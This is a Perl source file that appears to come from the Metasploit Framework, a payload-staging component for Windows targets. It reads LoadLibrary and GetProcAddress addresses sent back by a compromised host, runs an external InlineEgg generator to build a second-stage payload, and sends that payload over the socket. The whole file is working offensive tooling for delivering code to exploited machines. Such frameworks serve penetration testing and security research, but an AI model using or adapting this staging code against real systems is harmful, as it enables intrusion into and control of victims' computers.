package Msf::PayloadComponent::Windows::StagePayloadIE;
use strict;
use vars qw{@ISA};

sub _Import {
  my $class = shift;
  @ISA = ();
  foreach (@_) {
    eval("use $_");
    unshift(@ISA, $_);
  }
}

sub HandleConnection {
  my $self = shift;
  $self->SUPER::HandleConnection;
  my $sock = $self->PipeRemoteOut;
  my $blocking = $sock->blocking;
  $sock->blocking(1);


  my $InlineEgg = $self->GetVar('IEGG');
  my $LoadLibrary;
  my $GetProcAddr;
  my %opts;
  my @args;

  # read the function addresses 
  $sock->recv($LoadLibrary, 4);
  $sock->recv($GetProcAddr, 4);

  if(! $LoadLibrary || !$GetProcAddr)
  {
    $self->PrintLine('[*] Error reading addresses from remote host');
    $sock->blocking($blocking);
    return;
  }

  $opts{'LL'} = unpack('V', $LoadLibrary);
  $opts{'GP'} = unpack('V', $GetProcAddr);  
  
  foreach (keys(%opts)) {
    push @args, $_.'='.$opts{$_};
  }

  $self->PrintDebugLine(3, "Running: $InlineEgg ".join(" ",@args));

  local *PROG;
  local $/;
  
  if(! open(PROG, "-|"))
  {
      exec($InlineEgg, @args);
      exit(0);
  }

  my $payload = <PROG>;
  close(PROG);

  $self->PrintLine('[*] Sending InlineEgg payload (' . length($payload) . ' bytes)');
  eval { $sock->send($payload); };
  $self->PrintDebugLine(3, '[*] Payload Sent.');

  $sock->blocking($blocking);
}

1;
